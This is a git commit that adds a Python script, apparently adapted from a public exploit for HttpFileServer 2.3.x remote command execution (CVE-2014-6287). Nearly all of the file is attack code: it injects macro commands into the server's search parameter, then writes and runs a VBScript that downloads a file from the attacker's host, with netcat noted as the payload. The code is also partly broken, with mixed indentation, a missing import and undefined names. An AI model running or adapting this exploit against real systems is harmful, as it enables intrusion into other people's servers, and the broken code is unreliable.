222bf02651f78fb90fe5865865e45e4cd859e3a0
$_TYLER <tlb1986@sbcglobal.net>
2019-02-09 00:38:56 -0600

    Add files via upload

---
+++ 39161_privesc.py
@@ -0,0 +1,48 @@
+#!/usr/bin/python
+# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
+# Google Dork: intext:"httpfileserver 2.3"
+# Date: 04-01-2016
+# Remote: Yes
+# Exploit Author: Avinash Kumar Thapa aka "-Acid"
+# Vendor Homepage: http://rejetto.com/
+# Software Link: http://sourceforge.net/projects/hfs/
+# Version: 2.3.x
+# Tested on: Windows Server 2008 , Windows 8, Windows 7
+# CVE : CVE-2014-6287
+# Description: You can use HFS (HTTP File Server) to send and receive files.
+#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
+#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
+ 
+#Usage : python Exploit.py <Target IP address> <Target Port Number>
+
+#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
+#          You may need to run it multiple times for success!
+
+
+import urllib2
+import sys
+
+try:
+	def script_create():
+		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")
+
+	def execute_script():
+		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")
+
+	def nc_run():
+		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")
+
+	ip_addr = sys.argv[3] 		# local IP address
+    filename = sys.argv[4] 		# filename to upload to remote system
+    scriptname = sys.argv[5] 	# the script that is created and executed
+	path = urllib.quote_plus(sys.argv[6])	# absolute path on remote system
+	vbs = path+scriptname+"|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2F"+filename+"%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22"+path+filename+"%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
+	save = "save|" + vbs
+    vbs2 = "cscript.exe%20"+path+scriptname
+	exe	 = "exec|"+vbs2
+	script_create()
+	execute_script()
+except:
+	print """[.]Something went wrong..!
+	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number> <LHOST> <filename> <scriptname> <path>"""
+    raise
